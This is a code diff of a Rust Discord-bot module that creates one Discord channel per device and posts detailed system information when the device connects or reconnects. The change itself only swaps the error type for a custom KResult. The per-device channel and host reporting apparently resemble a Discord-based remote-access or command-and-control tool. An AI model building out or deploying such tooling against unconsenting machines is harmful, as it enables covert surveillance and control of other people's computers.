@@ -4,7 +4,6 @@ use crate::system_info::{DeviceInfo, SystemInfo};
 use crate::log_debug;
 use crate::prelude::*;
 use crate::prelude::serenity;
-use anyhow::Result;
 use std::sync::Arc;
 
 pub struct ChannelManager {
@@ -17,7 +16,7 @@ impl ChannelManager {
         Self { http, guild_id }
     }
 
-    pub async fn init_dchannel(&self) -> Result<ChannelId> {
+    pub async fn init_dchannel(&self) -> KResult<ChannelId> {
         let device_name = DeviceId::get_device_channel_name()?;
         log_debug!("Looking for device channel: {}", device_name);
 
@@ -38,7 +37,7 @@ impl ChannelManager {
         Ok(channel_id)
     }
 
-    async fn find_cbn(&self, channel_name: &str) -> Result<Option<ChannelId>> {
+    async fn find_cbn(&self, channel_name: &str) -> KResult<Option<ChannelId>> {
         let channels = self.http.get_channels(self.guild_id).await?;
 
         for channel in channels {
@@ -50,7 +49,7 @@ impl ChannelManager {
         Ok(None)
     }
 
-    async fn create_dchannel(&self, channel_name: &str) -> Result<ChannelId> {
+    async fn create_dchannel(&self, channel_name: &str) -> KResult<ChannelId> {
         let channel = self.guild_id.create_channel(&self.http, 
             serenity::builder::CreateChannel::new(channel_name)
                 .kind(serenity::model::channel::ChannelType::Text)
@@ -60,7 +59,7 @@ impl ChannelManager {
         Ok(channel.id)
     }
 
-    async fn announce_device(&self, channel_id: ChannelId) -> Result<()> {
+    async fn announce_device(&self, channel_id: ChannelId) -> KResult<()> {
         let system_info = SystemInfo::get_detailed_info()?;
         let device_profile = DeviceInfo::new()?;
         let message = system_info.format_reconnection(&device_profile);
@@ -98,7 +97,7 @@ impl ChannelManager {
         Ok(())
     }
 
-    async fn announce_dconnect(&self, channel_id: ChannelId) -> Result<()> {
+    async fn announce_dconnect(&self, channel_id: ChannelId) -> KResult<()> {
         let system_info = SystemInfo::get_detailed_info()?;
         let device_profile = DeviceInfo::new()?;
         let message = system_info.format_for_discord(&device_profile);
